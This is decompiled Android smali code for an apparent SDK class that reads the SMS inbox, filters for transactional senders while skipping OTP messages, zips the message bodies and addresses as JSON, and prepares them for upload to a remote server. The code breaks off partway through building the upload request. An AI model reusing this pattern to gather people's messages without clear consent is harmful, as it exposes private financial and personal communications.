.class public final Lcom/horcrux/malfoy/manager/IngestionSmsSyncManager;
.super Lcom/horcrux/malfoy/MalfoyEventTracker;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/horcrux/malfoy/manager/IngestionSmsSyncManager$Companion;
    }
.end annotation

.annotation runtime Lkotlin/Metadata;
    d1 = {
        "\u0000\u000c\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\u0008\u0002\u0008\u0000\u0018\u00002\u00020\u0001:\u0001\u0002\u00a8\u0006\u0003"
    }
    d2 = {
        "Lcom/horcrux/malfoy/manager/IngestionSmsSyncManager;",
        "Lcom/horcrux/malfoy/MalfoyEventTracker;",
        "Companion",
        "malfoy_release"
    }
    k = 0x1
    mv = {
        0x1,
        0x8,
        0x0
    }
.end annotation


# instance fields
.field public final f:Landroid/content/Context;

.field public final g:Landroid/net/Uri;

.field public final h:[Ljava/lang/String;

.field public final i:Lkotlin/Lazy;

.field public j:Z

.field public final k:I


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 6

    invoke-direct {p0, p1}, Lcom/horcrux/malfoy/MalfoyEventTracker;-><init>(Landroid/content/Context;)V

    iput-object p1, p0, Lcom/horcrux/malfoy/manager/IngestionSmsSyncManager;->f:Landroid/content/Context;

    const-string p1, "content://sms/inbox"

    invoke-static {p1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object p1

    iput-object p1, p0, Lcom/horcrux/malfoy/manager/IngestionSmsSyncManager;->g:Landroid/net/Uri;

    const-string v0, "_id"

    const-string v1, "address"

    const-string v2, "body"

    const-string v3, "date"

    const-string v4, "read"

    const-string v5, "seen"

    filled-new-array/range {v0 .. v5}, [Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Lcom/horcrux/malfoy/manager/IngestionSmsSyncManager;->h:[Ljava/lang/String;

    sget-object p1, Lcom/horcrux/malfoy/manager/IngestionSmsSyncManager$dateRanges$2;->c:Lcom/horcrux/malfoy/manager/IngestionSmsSyncManager$dateRanges$2;

    invoke-static {p1}, Lkotlin/LazyKt;->b(Lkotlin/jvm/functions/Function0;)Lkotlin/Lazy;

    move-result-object p1

    iput-object p1, p0, Lcom/horcrux/malfoy/manager/IngestionSmsSyncManager;->i:Lkotlin/Lazy;

    const/16 p1, 0x3e8

    iput p1, p0, Lcom/horcrux/malfoy/manager/IngestionSmsSyncManager;->k:I

    return-void
.end method


# virtual methods
.method public final f()Z
    .locals 8

    sget-object v0, Lcom/horcrux/malfoy/Malfoy;->a:Ljava/text/SimpleDateFormat;

    iget-object v0, p0, Lcom/horcrux/malfoy/manager/IngestionSmsSyncManager;->f:Landroid/content/Context;

    invoke-static {v0}, Lcom/horcrux/malfoy/Malfoy;->f(Landroid/content/Context;)Z

    move-result v1

    const/4 v2, 0x1

    if-nez v1, :cond_0

    const-string v0, "sms-sync-no-server-info"

    invoke-static {v0}, Lcom/horcrux/malfoy/Malfoy;->c(Ljava/lang/String;)Ljava/util/HashMap;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/horcrux/malfoy/MalfoyEventTracker;->d(Ljava/util/HashMap;)V

    return v2

    :cond_0
    const-string v1, "upload-sms-to-table"

    invoke-static {v1}, Lcom/horcrux/malfoy/Malfoy;->c(Ljava/lang/String;)Ljava/util/HashMap;

    move-result-object v1

    new-instance v3, Ljava/util/LinkedHashMap;

    invoke-direct {v3}, Ljava/util/LinkedHashMap;-><init>()V

    const-string v4, "android.permission.READ_SMS"

    invoke-static {v0, v4}, Landroidx/core/content/ContextCompat;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    const-string v4, "sms-permission"

    if-nez v0, :cond_3

    const-string v0, "true"

    invoke-interface {v3, v4, v0}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const/4 v0, 0x0

    :try_start_0
    sget-object v4, Lcom/horcrux/malfoy/MalfoyApiManager;->a:Lokhttp3/OkHttpClient;

    invoke-static {}, Lcom/horcrux/malfoy/MalfoyApiManager;->c()Lcom/horcrux/malfoy/MalfoySmsSyncMetaDataResponse;

    move-result-object v4

    invoke-virtual {v4}, Lcom/horcrux/malfoy/MalfoySmsSyncMetaDataResponse;->a()Z

    move-result v5

    if-eqz v5, :cond_1

    invoke-virtual {v4}, Lcom/horcrux/malfoy/MalfoySmsSyncMetaDataResponse;->d()Z

    move-result v5

    iput-boolean v5, p0, Lcom/horcrux/malfoy/manager/IngestionSmsSyncManager;->j:Z

    invoke-virtual {v4}, Lcom/horcrux/malfoy/MalfoySmsSyncMetaDataResponse;->b()J

    move-result-wide v4

    iget v6, p0, Lcom/horcrux/malfoy/manager/IngestionSmsSyncManager;->k:I

    int-to-long v6, v6

    add-long/2addr v4, v6

    invoke-virtual {p0, v4, v5}, Lcom/horcrux/malfoy/manager/IngestionSmsSyncManager;->g(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :catch_0
    move-exception v2

    goto :goto_1

    :cond_1
    :goto_0
    move v2, v0

    goto :goto_2

    :goto_1
    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    const-string v4, "metainfo-error"

    if-nez v2, :cond_2

    move-object v2, v4

    :cond_2
    invoke-interface {v3, v4, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual {p0, v1, v3}, Lcom/horcrux/malfoy/MalfoyEventTracker;->e(Ljava/util/HashMap;Ljava/util/LinkedHashMap;)V

    goto :goto_0

    :cond_3
    const-string v0, "false"

    invoke-interface {v3, v4, v0}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual {p0, v1, v3}, Lcom/horcrux/malfoy/MalfoyEventTracker;->e(Ljava/util/HashMap;Ljava/util/LinkedHashMap;)V

    :goto_2
    return v2
.end method

.method public final g(J)V
    .locals 30

    move-object/from16 v1, p0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    const/4 v0, 0x2

    new-instance v13, Ljava/util/ArrayList;

    invoke-direct {v13}, Ljava/util/ArrayList;-><init>()V

    invoke-static {v2, v3}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v2

    invoke-static/range {p1 .. p2}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v3

    filled-new-array {v2, v3}, [Ljava/lang/String;

    move-result-object v8

    iget-object v2, v1, Lcom/horcrux/malfoy/manager/IngestionSmsSyncManager;->f:Landroid/content/Context;

    invoke-virtual {v2}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v4

    iget-object v5, v1, Lcom/horcrux/malfoy/manager/IngestionSmsSyncManager;->g:Landroid/net/Uri;

    iget-object v6, v1, Lcom/horcrux/malfoy/manager/IngestionSmsSyncManager;->h:[Ljava/lang/String;

    const-string v7, "date < ? AND date > ?"

    const-string v9, "date desc"

    invoke-virtual/range {v4 .. v9}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v3

    if-eqz v3, :cond_14

    invoke-interface {v3}, Landroid/database/Cursor;->getCount()I

    move-result v4

    if-lez v4, :cond_14

    invoke-static {v0}, Lcom/horcrux/malfoy/Malfoy;->i(I)Ljava/lang/String;

    move-result-object v4

    invoke-interface {v3}, Landroid/database/Cursor;->getCount()I

    move-result v5

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "IngestionSmsManager: "

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " sms queried "

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v4, " sms."

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lcom/horcrux/malfoy/UtilsKt;->a(Ljava/lang/String;)V

    new-instance v14, Ljava/util/ArrayList;

    invoke-direct {v14}, Ljava/util/ArrayList;-><init>()V

    :cond_0
    :goto_0
    invoke-interface {v3}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    const-wide/16 v5, 0x0

    if-eqz v4, :cond_7

    const-string v4, "address"

    invoke-interface {v3, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v3, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    const-string v4, "body"

    invoke-interface {v3, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v3, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    if-eqz v7, :cond_0

    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v4

    if-nez v4, :cond_1

    goto :goto_0

    :cond_1
    invoke-static {}, Lcom/horcrux/malfoy/Malfoy;->e()Lcom/horcrux/malfoy/ServerConnection;

    move-result-object v4

    invoke-virtual {v4}, Lcom/horcrux/malfoy/ServerConnection;->i()Lcom/horcrux/malfoy/SmsSyncConfigMalfoy;

    move-result-object v4

    invoke-virtual {v4}, Lcom/horcrux/malfoy/SmsSyncConfigMalfoy;->a()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v9

    if-nez v9, :cond_2

    const-string v4, "^[a-zA-Z0-9]{2}-?[a-zA-Z0-9]{4,6}$"

    :cond_2
    sget-object v9, Lcom/horcrux/malfoy/RegexPatterns;->a:Ljava/util/regex/Pattern;

    invoke-static {v4}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v4

    const-string v9, "compile(regexString)"

    invoke-static {v4, v9}, Lkotlin/jvm/internal/Intrinsics;->f(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v4, v7}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v4

    invoke-virtual {v4}, Ljava/util/regex/Matcher;->find()Z

    move-result v4

    if-eqz v4, :cond_0

    if-eqz v8, :cond_0

    invoke-virtual {v8}, Ljava/lang/String;->length()I

    move-result v4

    if-nez v4, :cond_3

    goto :goto_0

    :cond_3
    invoke-static {}, Lcom/horcrux/malfoy/Malfoy;->e()Lcom/horcrux/malfoy/ServerConnection;

    move-result-object v4

    invoke-virtual {v4}, Lcom/horcrux/malfoy/ServerConnection;->i()Lcom/horcrux/malfoy/SmsSyncConfigMalfoy;

    move-result-object v4

    invoke-virtual {v4}, Lcom/horcrux/malfoy/SmsSyncConfigMalfoy;->b()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v9

    if-nez v9, :cond_4

    const-string v4, "^(?i)(?:(?!otp\\b).)*$"

    :cond_4
    new-instance v9, Lkotlin/text/Regex;

    sget-object v10, Lkotlin/text/RegexOption;->IGNORE_CASE:Lkotlin/text/RegexOption;

    invoke-direct {v9, v4, v10}, Lkotlin/text/Regex;-><init>(Ljava/lang/String;Lkotlin/text/RegexOption;)V

    invoke-virtual {v9, v8}, Lkotlin/text/Regex;->matches(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_5

    goto :goto_0

    :cond_5
    const-string v4, "date"

    invoke-interface {v3, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v3, v4}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v9

    cmp-long v4, v9, v5

    if-gez v4, :cond_6

    const-string v4, "negative-timestamp"

    invoke-static {v4}, Lcom/horcrux/malfoy/Malfoy;->c(Ljava/lang/String;)Ljava/util/HashMap;

    move-result-object v4

    new-instance v5, Ljava/util/LinkedHashMap;

    invoke-direct {v5}, Ljava/util/LinkedHashMap;-><init>()V

    const-string v6, "timestamp"

    invoke-static {v9, v10}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v11

    invoke-interface {v5, v6, v11}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual {v1, v4, v5}, Lcom/horcrux/malfoy/MalfoyEventTracker;->e(Ljava/util/HashMap;Ljava/util/LinkedHashMap;)V

    :cond_6
    const-string v4, "_id"

    invoke-interface {v3, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v3, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v5

    const-string v4, "read"

    invoke-interface {v3, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v3, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v11

    const-string v4, "seen"

    invoke-interface {v3, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v3, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v12

    new-instance v15, Lcom/horcrux/malfoy/model/SmsEntity;

    move-object v4, v15

    move-object v6, v7

    move-object v7, v8

    move-wide v8, v9

    move v10, v11

    move v11, v12

    move v12, v0

    invoke-direct/range {v4 .. v12}, Lcom/horcrux/malfoy/model/SmsEntity;-><init>(ILjava/lang/String;Ljava/lang/String;JIII)V

    invoke-virtual {v14, v15}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto/16 :goto_0

    :cond_7
    invoke-virtual {v13, v14}, Ljava/util/ArrayList;->addAll(Ljava/util/Collection;)Z

    invoke-interface {v3}, Landroid/database/Cursor;->close()V

    new-instance v0, Ljava/io/File;

    invoke-virtual {v2}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v3

    invoke-virtual {v3}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v3

    const-string v4, "/smsSync"

    invoke-static {v3, v4}, Lcom/paynimo/android/payment/a;->d(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v0, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->mkdir()Z

    const/4 v3, 0x0

    :goto_1
    invoke-virtual {v13}, Ljava/util/ArrayList;->size()I

    move-result v7

    iget-object v8, v1, Lcom/horcrux/malfoy/manager/IngestionSmsSyncManager;->i:Lkotlin/Lazy;

    if-ge v3, v7, :cond_d

    const-string v7, "this as java.lang.String).getBytes(charset)"

    new-instance v10, Ljava/io/File;

    invoke-virtual {v2}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v11

    invoke-virtual {v11}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v11

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v14

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v12, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v11, "/smsSync/sms_"

    invoke-virtual {v12, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12, v14, v15}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-direct {v10, v11}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {}, Lcom/horcrux/malfoy/Malfoy;->e()Lcom/horcrux/malfoy/ServerConnection;

    move-result-object v11

    invoke-virtual {v11}, Lcom/horcrux/malfoy/ServerConnection;->j()I

    move-result v11

    invoke-static {}, Lcom/horcrux/malfoy/Malfoy;->e()Lcom/horcrux/malfoy/ServerConnection;

    move-result-object v12

    invoke-virtual {v12}, Lcom/horcrux/malfoy/ServerConnection;->l()I

    move-result v12

    mul-int/2addr v12, v11

    invoke-virtual {v13, v3}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v11

    check-cast v11, Lcom/horcrux/malfoy/model/SmsEntity;

    iget-wide v14, v11, Lcom/horcrux/malfoy/model/SmsEntity;->d:J

    new-instance v11, Ljava/util/zip/ZipOutputStream;

    new-instance v0, Ljava/io/FileOutputStream;

    invoke-direct {v0, v10}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v11, v0}, Ljava/util/zip/ZipOutputStream;-><init>(Ljava/io/OutputStream;)V

    :try_start_0
    new-instance v0, Ljava/util/zip/ZipEntry;

    const-string v5, "sms.txt"

    invoke-direct {v0, v5}, Ljava/util/zip/ZipEntry;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11, v0}, Ljava/util/zip/ZipOutputStream;->putNextEntry(Ljava/util/zip/ZipEntry;)V

    const-string v0, "["

    sget-object v5, Lkotlin/text/Charsets;->a:Ljava/nio/charset/Charset;

    invoke-virtual {v0, v5}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v0

    invoke-static {v0, v7}, Lkotlin/jvm/internal/Intrinsics;->f(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v11, v0}, Ljava/io/OutputStream;->write([B)V

    const/4 v0, 0x0

    const-wide/16 v5, 0x0

    :goto_2
    invoke-virtual {v13}, Ljava/util/ArrayList;->size()I

    move-result v9

    if-ge v3, v9, :cond_c

    invoke-virtual {v13, v3}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Lcom/horcrux/malfoy/model/SmsEntity;

    new-instance v1, Lorg/json/JSONObject;

    move-object/from16 v18, v4

    new-instance v4, Lcom/google/gson/Gson;

    invoke-direct {v4}, Lcom/google/gson/Gson;-><init>()V

    move-object/from16 v19, v2

    new-instance v2, Lcom/horcrux/malfoy/SmsData;

    move-wide/from16 v20, v14

    iget-object v14, v9, Lcom/horcrux/malfoy/model/SmsEntity;->b:Ljava/lang/String;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    move-wide/from16 v22, v5

    iget-wide v5, v9, Lcom/horcrux/malfoy/model/SmsEntity;->d:J

    const-string v15, ""

    if-nez v14, :cond_8

    move-object v14, v15

    :cond_8
    :try_start_1
    iget-object v9, v9, Lcom/horcrux/malfoy/model/SmsEntity;->c:Ljava/lang/String;

    if-nez v9, :cond_9

    goto :goto_3

    :cond_9
    move-object v15, v9

    :goto_3
    invoke-direct {v2, v5, v6, v14, v15}, Lcom/horcrux/malfoy/SmsData;-><init>(JLjava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v4, v2}, Lcom/google/gson/Gson;->toJson(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    invoke-virtual {v13}, Ljava/util/ArrayList;->size()I

    move-result v2

    const/4 v4, 0x1

    sub-int/2addr v2, v4

    if-ge v3, v2, :cond_a

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v1, ","

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    sget-object v2, Lkotlin/text/Charsets;->a:Ljava/nio/charset/Charset;

    invoke-virtual {v1, v2}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v1

    invoke-static {v1, v7}, Lkotlin/jvm/internal/Intrinsics;->f(Ljava/lang/Object;Ljava/lang/String;)V

    goto :goto_4

    :catchall_0
    move-exception v0

    move-object v1, v0

    goto/16 :goto_6

    :cond_a
    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v2, "jsonObject.toString()"

    invoke-static {v1, v2}, Lkotlin/jvm/internal/Intrinsics;->f(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v2, Lkotlin/text/Charsets;->a:Ljava/nio/charset/Charset;

    invoke-virtual {v1, v2}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v1

    invoke-static {v1, v7}, Lkotlin/jvm/internal/Intrinsics;->f(Ljava/lang/Object;Ljava/lang/String;)V

    :goto_4
    array-length v2, v1

    add-int/2addr v2, v0

    div-int/lit16 v2, v2, 0x400

    if-lt v2, v12, :cond_b

    goto :goto_5

    :cond_b
    array-length v2, v1

    add-int/2addr v0, v2

    invoke-virtual {v11, v1}, Ljava/io/OutputStream;->write([B)V

    add-int/lit8 v3, v3, 0x1

    move-object/from16 v1, p0

    move-object/from16 v4, v18

    move-object/from16 v2, v19

    move-wide/from16 v14, v20

    goto/16 :goto_2

    :cond_c
    move-object/from16 v19, v2

    move-object/from16 v18, v4

    move-wide/from16 v22, v5

    move-wide/from16 v20, v14

    :goto_5
    invoke-interface {v8}, Lkotlin/Lazy;->getValue()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/util/Map;

    invoke-virtual {v10}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v1

    const-string v2, "zipFile.name"

    invoke-static {v1, v2}, Lkotlin/jvm/internal/Intrinsics;->f(Ljava/lang/Object;Ljava/lang/String;)V

    new-instance v2, Lkotlin/Pair;

    invoke-static/range {v22 .. v23}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v4

    invoke-static/range {v20 .. v21}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v5

    invoke-direct {v2, v4, v5}, Lkotlin/Pair;-><init>(Ljava/lang/Object;Ljava/lang/Object;)V

    invoke-interface {v0, v1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "]"

    sget-object v1, Lkotlin/text/Charsets;->a:Ljava/nio/charset/Charset;

    invoke-virtual {v0, v1}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v0

    invoke-static {v0, v7}, Lkotlin/jvm/internal/Intrinsics;->f(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v11, v0}, Ljava/io/OutputStream;->write([B)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    const/4 v0, 0x0

    invoke-static {v11, v0}, Lkotlin/io/CloseableKt;->a(Ljava/io/Closeable;Ljava/lang/Throwable;)V

    move-object/from16 v1, p0

    move-object/from16 v4, v18

    move-object/from16 v2, v19

    const-wide/16 v5, 0x0

    goto/16 :goto_1

    :goto_6
    :try_start_2
    throw v1
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    :catchall_1
    move-exception v0

    move-object v2, v0

    invoke-static {v11, v1}, Lkotlin/io/CloseableKt;->a(Ljava/io/Closeable;Ljava/lang/Throwable;)V

    throw v2

    :cond_d
    move-object/from16 v19, v2

    move-object/from16 v18, v4

    invoke-virtual {v13}, Ljava/util/ArrayList;->size()I

    move-result v0

    if-lez v0, :cond_13

    new-instance v0, Ljava/io/File;

    invoke-virtual/range {v19 .. v19}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v1

    move-object/from16 v2, v18

    invoke-static {v1, v2}, Lcom/paynimo/android/payment/a;->d(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v1

    if-eqz v1, :cond_12

    array-length v2, v1

    const/4 v3, 0x0

    :goto_7
    if-ge v3, v2, :cond_12

    aget-object v4, v1, v3

    move-object/from16 v5, p0

    iget-boolean v6, v5, Lcom/horcrux/malfoy/manager/IngestionSmsSyncManager;->j:Z

    if-eqz v6, :cond_e

    array-length v6, v1

    const/4 v7, 0x1

    sub-int/2addr v6, v7

    if-ne v3, v6, :cond_f

    move v6, v7

    goto :goto_8

    :cond_e
    const/4 v7, 0x1

    :cond_f
    const/4 v6, 0x0

    :goto_8
    if-eqz v4, :cond_10

    invoke-interface {v8}, Lkotlin/Lazy;->getValue()Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Ljava/util/Map;

    invoke-virtual {v4}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v10

    invoke-interface {v9, v10}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v9

    if-nez v9, :cond_11

    :cond_10
    move-object/from16 v16, v1

    goto/16 :goto_9

    :cond_11
    invoke-interface {v8}, Lkotlin/Lazy;->getValue()Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Ljava/util/Map;

    invoke-virtual {v4}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v10

    invoke-interface {v9, v10}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v9

    invoke-static {v9}, Lkotlin/jvm/internal/Intrinsics;->d(Ljava/lang/Object;)V

    check-cast v9, Lkotlin/Pair;

    array-length v10, v1

    add-int/lit8 v11, v3, 0x1

    sget-object v12, Lokhttp3/MultipartBody$Part;->Companion:Lokhttp3/MultipartBody$Part$Companion;

    invoke-virtual {v4}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v14

    sget-object v15, Lokhttp3/RequestBody;->Companion:Lokhttp3/RequestBody$Companion;

    sget-object v7, Lokhttp3/MediaType;->Companion:Lokhttp3/MediaType$Companion;

    move-object/from16 v16, v1

    const-string v1, "application/zip"

    invoke-virtual {v7, v1}, Lokhttp3/MediaType$Companion;->get(Ljava/lang/String;)Lokhttp3/MediaType;

    move-result-object v1

    invoke-virtual {v15, v4, v1}, Lokhttp3/RequestBody$Companion;->create(Ljava/io/File;Lokhttp3/MediaType;)Lokhttp3/RequestBody;

    move-result-object v1

    const-string v4, "file"

    invoke-virtual {v12, v4, v14, v1}, Lokhttp3/MultipartBody$Part$Companion;->createFormData(Ljava/lang/String;Ljava/lang/String;Lokhttp3/RequestBody;)Lokhttp3/MultipartBody$Part;

    move-result-object v1

    sget-object v7, Lcom/horcrux/malfoy/MalfoyApiManager;->a:Lokhttp3/OkHttpClient;

    invoke-virtual {v9}, Lkotlin/Pair;->getFirst()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Ljava/lang/Number;

    invoke-virtual {v7}, Ljava/lang/Number;->longValue()J

    move-result-wide v19

    invoke-virtual {v9}, Lkotlin/Pair;->getSecond()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Ljava/lang/Number;

    invoke-virtual {v7}, Ljava/lang/Number;->longValue()J

    move-result-wide v21

    invoke-static {v1, v4}, Lkotlin/jvm/internal/Intrinsics;->g(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v4, Lcom/horcrux/malfoy/MalfoyApiManager;->e:Lkotlin/Lazy;

    invoke-interface {v4}, Lkotlin/Lazy;->getValue()Ljava/lang/Object;

    move-result-object v4

    move-object/from16 v17, v4

    check-cast v17, Lcom/horcrux/malfoy/SmsProcessorService;

    sget-object v4, Lokhttp3/MultipartBody;->FORM:Lokhttp3/MediaType;

    const-string v7, "Android"

    invoke-virtual {v15, v7, v4}, Lokhttp3/RequestBody$Companion;->create(Ljava/lang/String;Lokhttp3/MediaType;)Lokhttp3/RequestBody;

    move-result-object v23

    invoke-static {}, Lcom/horcrux/malfoy/Malfoy;->e()Lcom/horcrux/malfoy/ServerConnection;

    move-result-object v7

    invoke-virtual {v7}, Lcom/horcrux/malfoy/ServerConnection;->d()Lcom/horcrux/malfoy/HeaderDetail;

    move-result-object v7

    invoke-virtual {v7}, Lcom/horcrux/malfoy/HeaderDetail;->e()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v15, v7, v4}, Lokhttp3/RequestBody$Companion;->create(Ljava/lang/String;Lokhttp3/MediaType;)Lokhttp3/RequestBody;

    move-result-object v24

    invoke-static {}, Lcom/horcrux/malfoy/Malfoy;->e()Lcom/horcrux/malfoy/ServerConnection;

    move-result-object v7

    invoke-virtual {v7}, Lcom/horcrux/malfoy/ServerConnection;->d()Lcom/horcrux/malfoy/HeaderDetail;

    move-result-object v7

    invoke-virtual {v7}, Lcom/horcrux/malfoy/HeaderDetail;->c()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v15, v7, v4}, Lokhttp3/RequestBody$Companion;->create(Ljava/lang/String;Lokhttp3/MediaType;)Lokhttp3/RequestBody;

    move-result-object v25

    invoke-static {}, Lcom/horcrux/malfoy/Malfoy;->e()Lcom/horcrux/malfoy/ServerConnection;

    move-result-object v7

    invoke-virtual {v7}, Lcom/horcrux/malfoy/ServerConnection;->d()Lcom/horcrux/malfoy/HeaderDetail;

    move-result-object v7

    invoke-virtual {v7}, Lcom/horcrux/malfoy/HeaderDetail;->a()Ljava/lang/String;

    move-result-object v7

